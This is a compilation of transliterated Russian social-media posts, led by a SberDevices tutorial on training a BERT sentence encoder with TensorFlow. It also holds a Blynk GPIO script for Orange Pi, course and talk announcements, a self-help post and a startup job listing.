Obuchenie modeli estestvennogo iazyka s BERT i Tensorflow  Ris. 1. Frazy i predlozheniia v vektornom predstavlenii modeli estestvennogo iazyka  Obrabotka estestvennogo iazyka (Natural Language Processing, NLP) - eto oblast' vychislitel'noi lingvistiki, orientirovannaia na razrabotku mashin, sposobnykh ponimat' chelovecheskie iazyki. Razrabotka takikh mashin - odna iz zadach, kotorye reshaiut issledovateli i inzhenery v komande SberDevices. V sovremennoi komp'iuternoi lingvistike ponimanie smysla napisannogo ili skazannogo dostigaetsia s pomoshch'iu vektornykh modelei estestvennogo iazyka. Naprimer, v semeistve virtual'nykh assistentov Saliut takaia model' primeniaetsia dlia raspoznavaniia namerenii pol'zovatelia, vedeniia dialoga, vydeleniia imenovannykh sushchnostei i mnogikh drugikh zadach. V etoi stat'e my rassmotrim metod obucheniia modeli estestvennogo iazyka (NLU) na razmechennykh dannykh i realizatsiiu etogo metoda na python3 i tensorflow 1.15. Nizhe vy naidete poshagovoe rukovodstvo i primery koda. Kod vsego eksperimenta dostupen dlia vosproizvedeniia na Colab. Pomimo etogo, my vykladyvaem v publichnyi dostup russkuiu model' NLU klassa BERT-large [427 mln. parametrov]: tensorflow, pytorch. Prochitav etot post, vy uznaete:  chto takoe modeli NLU i kak oni primeniaiutsia v komp'iuternoi lingvistike; chto takoe vektory predlozhenii i kak ikh poluchit'; kak obuchit' vektorizator predlozhenii [NLU] na baze arkhitektury BERT; kak mozhno ispol'zovat' obuchennye modeli NLU   O NLU i priznakovykh prostranstvakh  Modeli mashinnogo obucheniia prinimaiut na vkhod dannye v tsifrovoi forme.   Pri rabote s tekstom pervoe, chto neobkhodimo sdelat', eto pereiti k ego tsifrovomu predstavleniiu.  Zadacha modelei estestvennogo iazyka - predstavliat' tekst v vektornoi forme. Etot protsess v angliiskoi literature nazyvaiut <<embedding>>, imeia v vidu, chto smysl slov otsifrovyvaetsia model'iu i zapisyvaetsia v vide uporiadochennogo nabora chislovykh znachenii (to est' vektora). Pervye modeli NLU takie kak Word2Vec <<ponimali>> smysl teksta tol'ko na urovne otdel'nykh slov, bez konteksta. Poslednie dostizheniia v komp'iuternoi lingvistike pozvolili pereiti k effektivnym vektornym predstavleniiam dlia tselykh predlozhenii i abzatsev teksta.   Ris. 2. Otnosheniia mezhdu slovami v vektornom prostranstve word2vec  Raspolozhenie fraz v vektornom prostranstve opredeliaetsia parametrami ispol'zuemoi modeli iazyka. Modeli obuchaiut takim obrazom, chto vektory, vychislennye imi, sokhraniaiut smyslovye otnosheniia mezhdu frazami - pokhozhie po smyslu predlozheniia kodiruiutsia v blizkie po metrike vektory. Poetomu na ikh osnove udobno primeniat' priemy instance-based learning, naprimer, metod blizhaishikh sosedei K-NN. Naibolee effektivnym na dannyi moment sposobom postroeniia modelei estestvennogo iazyka iavliaetsia obuchenie glubokikh neironnykh setei na osnove arkhitektury <<transformer>>: BERT, RoBERTa, GPT-3. Eti modeli universal'ny i sposobny izvlekat' iz teksta priznaki, poleznye dlia resheniia mnozhestva zadach tekstovogo analiza. Po etoi prichine ikh inogda nazyvaiut modeliami ponimaniia estestvennogo iazyka ili NLU.   Plan eksperimenta  Dlia obucheniia nashei modeli my ispol'zuem nabor dannykh Stanford Natural Language Inference, soderzhashchii pary predlozhenii s metkami, kotorye ukazyvaiut na sledstvie (<<entailment>>), protivorechie (<<contradiction>>) ili otsutstvie smyslovoi sviazi (<<neutral>>) mezhdu predlozheniiami. Dlia etikh dannykh na baze modeli BERT my vyuchim takoe vektornoe predstavlenie, chto skhodstvo mezhdu sootvetstvuiushchimi parami predlozhenii budet bol'she, chem skhodstvo mezhdu protivorechashchimi ili neitral'nymi po otnosheniiu drug k drugu. Plan etogo eksperimenta sleduiushchii:   Podgotovka naborov dannykh. Realizatsiia generatora batchei. Opredelenie funktsii poter'. Postroenie modeli. Podgotovka protsessa validatsii. Obuchenie modeli. Obsuzhdenie rezul'tatov i vyvody.  1. Podgotovka dannykh  Dlia nachala zagruzim datasety, neobkhodimye dlia obucheniia [SNLI, MNLI] i validatsii [STS SICK] nashei modeli. Krome etogo nam ponadobitsia predobuchennaia angliiskaia model' BERT. K schast'iu, vse eto lezhit v otkrytom dostupe:  Rassmotrim obuchaiushchie dannye. Vot nebol'shoi primer iz dataseta SNLI:   Ris. 3. Primer dataseta Stanford Natural Language Inference (snli_1.0_train.jsonl)  Legko videt', chto dlia kazhdogo unikal'nogo predlozheniia v kolonke <<sentence1>> v nabore est' neskol'ko sootvetstvuiushchikh emu primerov s metkami. Predlozheniia iz kolonki <<sentence1>> dalee my budem nazyvat' <<iakornymi primerami>> (anchor), a sootvetstvuiushchie predlozheniia iz <<sentence2>> - polozhitel'nymi ili otritsatel'nymi primerami, v zavisimosti ot metki <<label>>.  Chtoby rabotat' s datasetom bylo udobnee, dlia kazhdogo unikal'nogo iakornogo primera sozdadim otdel'nuiu zapis', soderzhashchuiu vse sootvetstvuiushchie emu primery s metkami. Zapisi, dlia kotorykh otsutstvuiut polozhitel'nye primery klassa <<entailment>>, my otfil'truem.  Takaia zapis' mogla by vygliadet' sleduiushchim obrazom:  { anchor: ["Net, ne otvechai."], contradiction: ['Otvet'te, pozhaluista.'], entailment: ["Ne otvechaite.", "Ne govorite ni slova".], neutral: ["Vyidite iz mashiny."]}   Preobrazuem k takomu formatu vse obuchaiushchie dannye iz datasetov SNLI i MNLI.  2. Batch-generator  Batch-generator - eto podprogramma, kotoraia generiruet iz dataseta pakety (batchi) dannykh dlia obuchaemoi neironnoi seti. Zadacha nashei seti - <<sblizhat'>> v vektornom prostranstve relevantnye pary predlozhenii i <<razdvigat'>> nerelevantnye (sm. Ris. 4).  Obuchat' model' my budem na tripletakh (a, p, n) gde  a -- iakornyi primer, berem iz polia <<anchor>>;  p -- polozhitel'nyi primer, vybiraem sredi tekh chto s metkoi <<entailment>>;  n -- otritsatel'nyi primer, berem iz <<contradiction>> i <<neutral>>.   Ris.4. Obuchenie NLU na tripletakh: polozhitel'nye primery p priblizhaiutsia, a otritsatel'nye n otdaliaiutsia ot iakornogo primera a v protsesse obucheniia modeli  V sluchae, esli razmechennogo otritsatel'nogo primera v datasete ne nashlos', vmesto nego vyberem randomnyi negativnyi primer iz dataseta. Obshchaia logika generatsii batcha realizovana v kode:  3. Funktsiia poter'  Teper' neobkhodimo formal'no opredelit' funktsiiu poter', minimizirovav kotoruiu, my nauchim model' luchshe rabotat' na nashikh dannykh. Dlia etogo zadachu <<sblizheniia>> perefrazirovannykh predlozhenii sformuliruem kak zadachu ranzhirovaniia.  Polozhim, chto imeetsia nabor iz k-par predlozhenii x i y i nuzhno vyuchit' funktsiiu, kotoraia otsenivaet, iavliaetsia li y perefrazirovkoi x ili net. Dlia kazhdogo x v nabore est' minimum odin polozhitel'nyi primer y i maksimum k-1 otritsatel'nykh primerov. Takoe raspredelenie mozhno zapisat' kak:   Nuzhnaia nam model' dolzhna maksimizirovat' P(y|x) dlia perefrazirovannykh par x,y i minimizirovat' dlia vsekh ostal'nykh.  Sovmestnuiu veroiatnost' P(x, y) -- budem otsenivat' s pomoshch'iu nekotoroi skoringovoi funktsii S:  Vo vremia obucheniia bylo by nepraktichno (slishkom dolgo) summirovat' po vsem k-primeram v datasete, chtoby chestno vychisliat' znamenatel'. Vmesto etogo my approksimiruem P(y|x), ogranichivaias' summirovaniem po primeram vnutri odnogo obuchaiushchego batcha:  V kachestve funktsii skhozhesti S v etom eksperimente budem ispol'zovat' skaliarnoe proizvedenie, to est' S(x,y) = <x, y>.  Pereidem k zadache minimizatsii. Dlia negative log likelihood-batcha razmerom K zapishem:  N.B.: Etu funktsiiu poter' inogda nazyvaiut cross entropy loss ili softmax-loss.  Vazhnoi osobennost'iu etoi funktsii poter' iavliaetsia to, chto ona ispol'zuet srazu neskol'ko (K) otritsatel'nykh primerov dlia kazhdogo polozhitel'nogo. Eto khorosho vliiaet na skhodimost' modeli, zastavliaia ee vyuchivat' bolee ustoichivye vektornye predstavleniia. Variant realizatsii etoi funktsii dlia tripleta (a):  4. Arkhitektura modeli  Arkhitektura modeli predstavliaet soboi siamskuiu neironnuiu set' s tremia vkhodami dlia tripleta <<anchor -- positive -- negative>>. K kazhdomu iz vkhodov primeniaetsia modul' BERT, kotoryi i budet vypolniat' rol' NLU v etom eksperimente. Modul' soderzhit v sebe wordpiece-tokenizator dlia preobrazovaniia vkhodnykh strok v BERT-sovmestimyi format (input_ids, input_mask, token_type_ids), a takzhe samu obuchaemuiu model' BERT dlia vektorizatsii teksta. K vykhodu poslednego encoder-sloia modeli primeniaem operatsiiu masked-mean-pooling, chtoby poluchit' edinyi vektor dlia predlozheniia. Vektorizovannyi takim obrazom triplet dalee primeniaetsia dlia vychisleniia softmax loss i obucheniia modeli.   Ris.5. Arkhitektura SBERT  Kod dlia sborki modeli:  5. Validatsiia rezul'tatov  Modeli NLU obychno otsenivaiutsia putem vektorizatsii razmechennykh par predlozhenii, izmereniia stepeni skhodstva mezhdu parami predlozhenii s pomoshch'iu testiruemoi modeli, a zatem vychisleniia korreliatsii etogo skhodstva s chelovecheskoi razmetkoi. Dlia otsenki angliiskikh modelei NLU obychno ispol'zuiutsia nabory dannykh STS 2012-2016 i SICK 2014. Vot nebol'shoi primer etikh dannykh:   Ris. 6. Primer dannykh iz dataseta STS2012 -- fail 2012.MSRpar.test.tsv  Kak i SNLI, dannyi dataset soderzhit pary predlozhenii. Otsifruem ikh model'iu i otsenim skhodstvo mezhdu predlozheniiami, vychisliv kosinusnuiu blizost' mezhdu ikh vektorami. V kachestve metriki budem ispol'zovat' rangovuiu korreliatsiiu Pirsona i Spirmena s metkami iz dataseta.  Kod Callback, soderzhashchego etu logiku:  6. Protsess obucheniia  Pochti vse gotovo: dannye, model' i paiplain validatsii. Obsudim teper' nekotorye giperparametry, kotorye neobkhodimo nastroit' pered tem, kak my nachnem obuchenie.  V Colab dlia obucheniia v nashem rasporiazhenii budet NVIDIA K80 (12Gb). Chtoby sokratit' kolichestvo neobkhodimoi videopamiati, vazhno pravil'no vybrat' maksimal'nuiu dlinu obrabatyvaemoi posledovatel'nosti (seq_len). V etom eksperimente my ogranichim ee 24 tokenami, chto budet dostatochno dlia kodirovaniia bol'shei chasti dannykh, ispol'zuemykh pri obuchenii.  Uvelichenie razmera batcha kraine polozhitel'no vliiaet na skhodimost' modeli - vyberem maksimal'nyi, kotoryi pomestitsia v pamiat' nashego GPU.  V kachestve optimizatora budem ispol'zovat' staryi dobryi Adam s nebol'shim learning rate. Obuchat' model' budem do skhozhdeniia, 10 epokh dolzhno khvatit'. Parametry obucheniia:   batch size = 128 dlia BERT-base; max_seq_len = 24; Optimizer Adam; Learning rate ~1e-5; Metriki -- [spearmanr]; Kol-vo epokh ~10.   trn_model.fit_generator(tr_gen._generator, validation_data=ts_gen._generator, steps_per_epoch=256, validation_steps=32, epochs=5, callbacks=callbacks) *** New best: STS_spearman_r = 0.5426 *** New best: STS_pearson_r = 0.5481 *** New best: SICK_spearman_r = 0.5799 *** New best: SICK_pearson_r = 0.6069 Epoch 1/10 255/256 [============================>.] - ETA: 1s - loss: 0.6858 ... Epoch 10/10 255/256 [============================>.] - ETA: 1s - loss: 0.2381 256/256 [==============================] - 525s 2s/step - loss: 0.2383 - val_loss: 0.2492 *** New best: STS-2012_spearman_r = 0.6115 *** New best: STS-2013_spearman_r = 0.8021 *** New best: STS-2014_spearman_r = 0.7292 *** New best: STS-2015_spearman_r = 0.8008 *** New best: STS-2016_spearman_r = 0.7776 *** New best: SICK_spearman_r = 0.792  7. Rezul'taty i vyvody  Dlia sravneniia rassmotrim rezul'taty riada modelei iz stat'i Sentence-BERT, gde avtory otsenili neskol'ko predvaritel'no obuchennykh sistem NLU na datasetakh STS i SICK. Luchshii rezul'tat na sete SICK v etoi stat'e poluchila model' Universal Sentence Encoder (USE) ot Google. Odnako posle 10 epokh obucheniia nasha model' sushchestvenno prevoskhodit ee pokazatel', dostigaia 0.792. Takzhe na datasetakh STS-2013 i STS-2016 obuchennaia nami model' demonstriruet luchshii rezul'tat, dazhe sredi modelei serii large:   Tablitsa 1: Rangovaia korreliatsiia Spirmena ? ? 100 mezhdu kosinusnoi blizost'iu vektorov predlozhenii i metkami dlia razlichnykh zadach Textual Similarity (STS). STS12-STS16: SemEval 2012-2016, STSb: STS-benchmark, SICK-R: SICK Relatedness dataset.  Kachestvo modeli mozhno uluchshat' i dalee, esli, naprimer:  uvelichit' razmer batcha; uvelichit' seq_len, chtoby obrezat' men'she predlozhenii po dline; pomeniat' model' NLU na chto-to pomoshchnee, naprimer, na BERT-large; razmetit' i dobavit' bol'she dannykh; ????   Bol'shinstvo iz etikh shagov potrebuet sushchestvennogo uvelicheniia trebuemoi vychislitel'noi moshchnosti. Odnako i vsego na odnoi GPU nam udalos' obuchit' dovol'no sil'nuiu model', prevoskhodiashchuiu po kachestvu SOTA-reshenie 2018 goda. Eto govorit o vysokoi effektivnosti rassmotrennogo nami metoda obucheniia.  Eksperimenty s russkoi model'iu NLU  Teper' rassmotrim popodrobnee opublikovannuiu nami russkuiu model' NLU. Ona uzhe sushchestvenno tiazhelee toi, chto my obuchali vyshe - eto BERT-large, v nei 24 sloia i 426.9 millionov parametrov! Za schet bol'shego razmera i glubiny eta model' mozhet vychisliat' gorazdo bolee nasyshchennye vektornye predstavleniia. Dlia obucheniia etoi modeli byl zadeistvovan uzhe tselyi klaster GPU na baze DGX-2, a obuchaiushchii nabor dannykh vkliuchaet v sebia bolee 16 mlrd. tokenov i soderzhit mnogie publichnye i proprietarnye datasety.  Raspoznavanie namerenii  Odna iz vazhnykh zadach NLP, kotoraia reshaetsia v Assistentakh semeistva Saliut, eto raspoznavanie namereniia pol'zovatelia po tekstu ego zaprosa. Vospol'zuemsia opublikovannoi russkoi model'iu, chtoby otsifrovat' i rassmotret' nebol'shoi dataset, ispol'zuemyi nami dlia raspoznavaniia namerenii na russkom iazyke.  Dataset sostoit iz primerov zaprosov s metkami, sootvetstvuiushchimi opredelennym pol'zovatel'skim namereniiam (uznat' pogodu, poslushat' skazku, zakazat' edu i t. p.). Poluchennye vektornye predstavleniia otobrazim v trekhmernom prostranstve s pomoshch'iu instrumenta Tensorflow Projector:   Khorosho vidno, chto klassy pol'zovatel'skikh zaprosov, predstavlennye v datasete, otlichno razdeliaiutsia v vektornom prostranstve, obrazuia chetko vyrazhennye klastery. Poverkh takikh vektorov mozhno postroit' KNN-model' ili obuchit' supervised-klassifikator.   Raspoznavanie obstsennykh zaprosov  Drugoi vazhnyi use case modelei NLU - primenenie ikh v kachestve osnovy dlia supervised-modelei klassifikatsii teksta. Takaia model' ispol'zuetsia v Saliute dlia raspoznavaniia oskorbitel'nykh ili toksichnykh zaprosov. K sozhaleniiu, publichnykh russkikh datasetov dlia etoi zadachi pod rukoi ne okazalos'. Odnako, moi kollega Andriljo reshil otsenit' model' na dannykh nedavno zakonchivshegosia sorevnovaniia Mail.ru po poisku toksichnykh kommentariev:   Klassifikator na osnove opublikovannoi modeli skhodu poluchaet 0.96 po metrike sorevnovaniia average_precission_score, chto sootvetstvuet 5 mestu v publichnom zachete. Bez ansamblei! Parametry obucheniia: SBERT NLU v kachestve bazovogo BertLayer; batch size = 128; max_seq_len = 64; N_tune_lrs = 12?24; Optimizer Adam; Learning rate ~5e-5; Metriki -- [avg F1micro, AvgPrecScore]; Kol-vo epokh ~3.   Skhema modeli - eto klassicheskii mnogosloinyi pertseptron poverkh fichei BERT: primeniaem mean pooling k poslednemu encoder-sloiu, chtoby poluchit' vektory predlozhenii, i dobavliaem sverkhu tri polnosviaznykh sloia. Model summary predstavlena nizhe:   Vash variant  Uvereny, chto chitateli smogut naiti mnozhestvo drugikh interesnykh primenenii nashei modeli NLU. Model' dostupna dlia skachivaniia v formate dlia tensorflow, pytorch, i tf-hub.  Blagodarnost'  Za pomoshch' v podgotovke posta vyrazhaiu blagodarnost' Aleksandru @Andriljo Abramovu i Kristine [id15798648|@Christina29] Lavreniuk.  #nlp, #lingvistika, #analizteksta

Nachinaiushchie. Distantsionnoe zaniatie cht 12.11 16:30  Segodnia prakticheskoe zaniatie. Vam predstoit reshit' 5 zadach. Nekotorye iz nikh my reshali v klasse - nuzhno vspomnit', kak my eto delali. Kak tol'ko prochitaete etot post - napishite + v soobshcheniia gruppy. Tak ia poimu, chto vy pristupili k vypolneniiu.  Pisat' kod mozhno v liubom meste, gde vam udobno. Naprimer, v reple, gde my vsegda eto delali: https://repl.it/languages/python3 Kod nuzhno budet skopirovat', vstavit' v fail s zadaniem posle sootvetstvuiushchei zadachi i otpravit' fail v soobshcheniia gruppy.  Srok - do 16:00 18.11

Profilakticheskaia psikhoterapiia  (poleznye uprazhneniia dlia mozga na kazhdyi den')    Byvaet tak, chto vrode i problem psikhologicheskikh net: nichem ne zagoniaesh'sia, legko kommunitsiruesh' s drugimi, znaesh' i delaesh' to, chto khochesh'... No vse ravno, zhizn' oshchushchaetsia kak-to odnoobrazno, shablonno, privychno... A ot etogo stanovitsia skuchno i propadaet interes. Slovno ugasaiut kraski, zhelaniia, chuvstva.    Eto sluchaetsia ot odnoobraziia. Mozg privykaet k odnim i tem zhe patternam, reaktsiiam i sposobam myshleniia. Tak, my postepenno prevrashchaemsia v biorobotov.    Odnako, est' prostye uprazhneniia, kotorye budut polezny dlia razvitiia mozga, ego funktsii i vozmozhnostei. Protsess etot ne bystryi, no pri reguliarnom vypolnenii etikh priemov vy postepenno zametite, kak v vashu zhizn' snova vozvrashchaetsia interes, iskra i vdokhnovenie. A trevoga i bespokoistvo, naoborot, sushchestvenno sniziatsia.    Nesmotria na to, chto takikh uprazhnenii mnozhestvo, ia rasskazhu vsego neskol'ko iz nikh. Dazhe etogo budet dostatochno dlia togo, chtoby ubrat' plesen' s rodnoi golovy.    1. Kazhdyi den' delaite chto-nibud' po-novomu. Nevazhno, chto eto budet. Idite za produktami novoi dorogoi, dazhe esli ona dol'she i slozhnee. Prigotov'te salat bez privychnykh ingridientov. Poprobuite pochistit' zuby pri pomoshchi nog. V obshchem, postaraites' kazhdyi den' delat' khotia by odnu veshch' inache. I zamet'te, kak vy budete sebia chuvstvovat'.    2. Vzgliad marsianina. Poprobuite priuchit' sebia kazhdyi den' smotret' na privychnye veshchi svezhim vzgliadom, kak esli by nikogda ne videli, ne slyshali i ne znali ob etikh veshchakh. Eto mogut byt' predmety byta, khorosho znakomye liudi, sobstvennye mysli i chuvstva. Privnesite v svoiu zhizn' nemnogo svezhesti. Mozhno nachat' s odnogo predmeta, i postepenno rasshiriat' obzor marsianina.    3. Spontannyi mozgovoi shturm. Dlia etogo vybirete liuboi predmet, chto lezhit riadom s vami i bystro, v techenie odnoi mituty nabrosaite nestandartnye varianty ego ispol'zovaniia. Naprimer, rasskazhite 20 sposobov ispol'zovat' zazhigalku ne po naznacheniiu.    4. Razvitie novykh sposobnostei i navykov. Eto mozhet byt' vse, chto ugodno. Glavnoe, chtoby vam eto nravilos'. Igra na barabanakh, izuchenie mongol'skogo iazyka, osvoenie Python3 ili zhonglirovanie kurinnymi iaitsami. Vse eto, kak ni stranno, blagotvorno skazhetsia na vashem mozge, i v tselom, obogatit vashe vospriiatie real'nosti.    5. Retrospektiva. Eshche etu tekhnologiiu nazyvaiut Metod Pifagora.  Sut' ee v tom, chtoby vspomnit', naprimer, proshedshii den' s maksimal'nymi podrobnostiami. Chto vy eli, chto delali, o chem dumali, kakie chuvstva ispytyvali. Zatem, vy mozhete zadat' sebe sleduiushchie voprosy:    - Chemu proshedshii den' menia nauchil? Chemu mozhno bylo nauchit'sia?  - Kakie dela mozhno bylo uluchshit'? Chemu posviatit' bol'she vremeni?  - Na chem stoit men'she fokusirovat' vnimanie i pochemu?  - Kak vcherashnii den' povliial na to, kak ia oshchushchaiu sebia seichas?  - Chto menia ostanavlivalo, chto vdokhnovlialo?    Poprobuite nachat' s odnogo dnia, a cherez nedeliu provedite retrospektivu vsei nedeli/mesiatsa/goda... Rezul'taty etoi tekhniki vas poraduiut uzhe cherez neskol'ko dnei. V vashei zhizni stanet bol'she vnimatel'nosti i osoznannosti, a eto dobavit uverennosti i spokoistviia.    6. Vnimanie na chuvstve "sebia". Vozmozhno, vy uzhe slyshali takie rekomendatsii ot dukhovnykh masterov: "Pochuvstvui, chto ty EST'." Eto oshchushchenie sobstvennogo prisutstviia, kogda vy fokusiruetes' ni na chem, krome togo, chto vy seichas est'. Zdes' vy obnaruzhite pokoi i legkost'. Eto tot samyi ostrovok bezopasnosti, kotoryi vsegda s vami. Da eto i est' nastoiashchii VY. Samoe slozhnoe zdes' - nichego ne delat'. Dazhe ne dumat' o sebe, a prosto zametit' oshchushchenie samikh sebia.    7. Pridumyvat' pokhozhie ili nepokhozhie uprazhneniia dlia povsednevnoi zhizni. Dlia etogo poprobuite naiti v etikh zaniatiiakh to, chto vam ponravitsia i prineset real'nuiu pol'zu.    Lichno dlia menia eti tekhniki byli polezny v osvoenii muzykal'nykh instrumentov. Ia osvaival arabskuiu darbuku, ramochnye barabany, a takzhe intellidzhent-stili igry na barabannoi ustanovke. Da i v povsednevnoi zhizni tozhe neplokho pomogaiut posmotret' na proiskhodiashchee bolee glubinno i vzaimosviazano.    Zhelaiu vam priiatnoi profilakticheskoi samopsikhoterapii!

Obuchenie modeli estestvennogo iazyka s BERT i Tensorflow Ris. 1. Frazy i predlozheniia v vektornom predstavlenii modeli estestvennogo iazyka  Obrabotka estestvennogo iazyka (Natural Language Processing, NLP) - eto oblast' vychislitel'noi lingvistiki, orientirovannaia na razrabotku mashin, sposobnykh ponimat' chelovecheskie iazyki. Razrabotka takikh mashin - odna iz zadach, kotorye reshaiut issledovateli i inzhenery v komande SberDevices.  V sovremennoi komp'iuternoi lingvistike ponimanie smysla napisannogo ili skazannogo dostigaetsia s pomoshch'iu vektornykh modelei estestvennogo iazyka. Naprimer, v semeistve virtual'nykh assistentov Saliut takaia model' primeniaetsia dlia raspoznavaniia namerenii pol'zovatelia, vedeniia dialoga, vydeleniia imenovannykh sushchnostei i mnogikh drugikh zadach.  V etoi stat'e my rassmotrim metod obucheniia modeli estestvennogo iazyka (NLU) na razmechennykh dannykh i realizatsiiu etogo metoda na python3 i tensorflow 1.15. Nizhe vy naidete poshagovoe rukovodstvo i primery koda. Kod vsego eksperimenta dostupen dlia vosproizvedeniia na Colab.   Pomimo etogo, my vykladyvaem v publichnyi dostup russkuiu model' NLU klassa BERT-large [427 mln. parametrov]: tensorflow, pytorch.  Prochitav etot post, vy uznaete:  chto takoe modeli NLU i kak oni primeniaiutsia v komp'iuternoi lingvistike; chto takoe vektory predlozhenii i kak ikh poluchit'; kak obuchit' vektorizator predlozhenii [NLU] na baze arkhitektury BERT; kak mozhno ispol'zovat' obuchennye modeli NLU #BlogkompaniiSberDevices #Mashinnoeobuchenie #NaturalLanguageProcessing #nlp(naturallanguageprocessing) #bert #deeplearning

#Blynk@arduinomarket , #Orange_pi@arduinomarket, #Python@arduinomarket   Blynk na iazyke python, ustanavlivaem na odnoplatnik Orange Pi, upravliaem GPIO  Ustanovka zavisimostei: sudo apt-get install python3-pip python3-dev git sudo pip3 install --upgrade pip  Upravlenie GPIO na Python: git clone https://github.com/duxingkei33/orange... cd orangepi_PC_gpio_pyH3 sudo python3.5 setup.py install  Ustanovka Blynk na Python: sudo pip3 install blynklib nano blynk.py sudo chmod +x blynk.py  sudo ./blynk.py  Kod programmy: #!/usr/bin/env python3 import blynklib from pyA20.gpio import gpio from pyA20.gpio import port from time import sleep gpio.init()  gpio.setcfg(port.PA6, gpio.OUTPUT)  BLYNK_AUTH = 'Vash Token BLINK' #insert your Auth Token here # base lib init blynk = blynklib.Blynk(BLYNK_AUTH)  @blynk.handle_event('write V4') def write_virtual_pin_handler(pin, value):  if str(value) == "['0']":  gpio.output(port.PA6, gpio.HIGH)  print("LED ON")  else:  gpio.output(port.PA6, gpio.LOW)  print("LED OFF")  while True:  blynk.run()

Chto takoe bazy dannykh? Svoiu samuiu pervuiu bazu dannykh (i ne tol'ko pervuiu) my realizovali s pomoshch'iu tekstovykh dokumentov, vedia poiski postrochno.   A o tom, chto takoe baza dannykh (net, ne tekstovye dokumentiki), i kak ikh lomat', v sviom doklade rasskazhet [id183265872|Pavel]   Na zaniatii rekomenduetsia ispol'zovat' linuks (dostatochno virtualki), ili nastroit' Windows (esli khotite svoimi ruchkami popraktikovatsia) Takzhe ustanovit' na mashinu: - python3 - mysql (nastroit' vkhod bez prav administratora) - modul' mysql dlia python - flask (python)  Priznakom togo, chto u vas vsio ok u vas zapustit'sia fail main.py (s nastroikoi pol'zovatelia v 11 strochke koda)  Prikhodite zavtra v 18:00 v nashem diskord kanale!

Khotite byt' v kurse trendov v Python i prokachat' navyki? Nachnite uglubliat' svoi znaniia uzhe 11 noiabria na demo-zaniatii <<Python2 vs Python3. Vozmozhnye trudnosti pri perekhode i osnovnye razlichiia versii>>.     Na zaniatii vy s prepodavatelem Ol'goi Sentemovoi rassmotrite razlichiia etikh dvukh versii, a takzhe slozhnosti, s kotorymi vy mozhete stolknut'sia pri perekhode na Python3.     Demo-zaniatie iavliaetsia chast'iu onlain-kursa <<Python Developer. Professional>>. Programma rasschitana na razrabotchikov s opytom ot 1 goda.     Dlia zapisi na zaniatie proidite vstupitel'nyi test: https://otus.pw/MWmz/

Friday razvivaetsia -- akseleratory, novye B2B klienty, investitsii, moshchnye fichi i rasshirenie komandy.   U nas est' * vakansii: prodazhi, razrabotka, klientskii opyt/podderzhka  * nespeshnye poiski: kom'iuniti-menedzhment, upravlenie produktom, marketing, akkaunt-menedzhment    Chto delaet Friday?  * Pomogaet HR'am uskoriat' onbording i prokachivat' vnutrikorporativnyi netvorking  * Pomogaet lideram soobshchestv rastit' v nikh gorizontal'nye sviazi  * Pol'zovateli nakhodiat v nashikh botakh dlia Slack/Microsoft Teams/Telegram edinomyshlennikov, ekspertov i kolleg iz raznykh industrii  * Dlia tekh, kto liubit formulirovki "uber for x", Friday -- eto "professional'nyi tinder", "privatnyi lunchclub" ili "random-kofe na steroidakh" (korotkoe demo https://t.me/MakeYourFridayBot)     Zachem my etim zanimaemsia?  Obshchenie -- draiver razvitiia, biznesa i kar'ery: nashei "biologicheskoi proshivke" neobkhodim kontakt s temi, komu mozhno doveriat'. Garvardskoe longitiudnoe issledovanie, idushchee uzhe bolee 80 let, pokazalo, chto blizkie otnosheniia s liud'mi vliiaiut na prodolzhitel'nost' zhizni i schast'e sil'nee, chem polozhenie v obshchestve, intellekt i geny. My provodim tret' vremeni zhizni na rabote, no do 40% sotrudnikov soobshchaiut o chuvstve izolirovannosti ot kolleg -- nuzhno pomeniat' etu vozmutitel'nuiu situatsiiu. Vprochem, nachinaem my s kompanii, kotorye uzhe aktivno zabotiatsia o svoikh liudiakh       Kto klienty?  Iandeks.Praktikum, MTS, VTB, UploadCare, 2GIS, SEMrush, izdatel'stvo MIF, Matemarketing, MarHR, GoGlobalWorld, Citymate, Fiztekh-Soiuz, FriendWork, Vysshaia shkola menedzhmenta SPbGU, ELK Academy, yCamp i desiatki drugikh potriasaiushchikh kompanii/soobshchestv (stat'ia v Rusbase https://rb.ru/list/business-tinder). Nekotorye klienty snachala razrabotali podobnye resheniia sami, no v itoge reshili rabotat' s Friday, oprobovav nashi algoritmy metchinga i vovlekaiushchie stsenarii       Kakie usloviia?  Prozrachnye tseli i protsessy, remote-first (no mozhno khodit' v ofis), stremitel'nyi rost po mere razvitiia kompanii, abstraktnye i ne ochen' memy v chatakh, draivovyi kollektiv s tsennostiami i missiei, topovye vneshnie mentory, optsion na fulltaime. A eshchio my ispol'zuem Friday, eto novyi klassnyi instrument dlia obmena luchshimi praktikami i sblizheniia s kollegami       Kakoi opyt u komandy?  V chisle predydushchikh rabotodatelei -- VK, Intel, Iandeks, DataArt, KROK, SEMrush, Oracle, Skyeng. Gluboko ponimaem potrebnosti HR'ov, topov i spetsialistov. V 2017-2019 faundery postroili produkt s pokhozhimi mekhanikami v B2C -- druzheskii deiting dlia samorazvitiia FriendZone, kotoryi prodolzhaet razvivat'sia parallel'no (stat'ia v Vedomostiakh https://www.vedomosti.ru/business/articles/2018/10/05/782850-kak-bot-prines-millioni)   Itak, kipiashchie pozitsii:     B2B Sales i B2B Sales Lead  Ozhidaem razumnost', samokhodnost' i umenie stroit' dolgosrochnye otnosheniia, obshirnuiu set' kontaktov i opyt v HR / HR tech / SaaS / EdTech; zhelatel'no -- upravlencheskie ambitsii i razgovornyi angliiskii.  Predstoit aktivno privlekat' krupnye/rastushchie kompanii, dorabotat' skoring i sistemu prodazh, tochechno stavit' marketing-zadachi kollegam i podriadchikam. V ideale -- postroit' moshchnyi otdel i lidirovat' vykhod na mezhdunarodnye rynki v 2021 godu. No ne budem vozrazhat', esli ty reshish' prodolzhit' mnogo zarabatyvat' s rossiiskimi klientami         Software Engineer (dve pozitsii)  Ozhidaem razumnost' i azart. S nas smysl v rabote, poniatnyi fokus, kollegi s razvitymi soft-skillami, blagodarnye pol'zovateli i nikakikh soveshchanii radi soveshchanii. Kod pokryvaem testami, deploim v Kubernetes. Svezhaishii stek: Python3, Django3.1, Angular9.  Est' vakansii v oboikh proektakh "kholdinga FrFr" -- Friday i FriendZone. Vozmozhen part-taim            Customer Success Manager  Ozhidaem razumnost' i empatiiu, otlichnoe vladenie pis'mennoi rech'iu, interes k vnutrennim kommunikatsiiam, soobshchestvam i netvorkingu. A takzhe umenie ne tol'ko tushit' pozhary, no i produmyvat' resheniia dlia ikh predotvrashcheniia. Zhelatel'no -- opyt v menedzhmente i vedenii bazy znanii       Nespeshnyi poisk  Community Manager, Account Manager, Marketing Lead, Product Manager    Planiruem naim cherez neskol'ko mesiatsev, no budem rady poznakomit'sia zaranee. Est' zadachi na part-taim -- 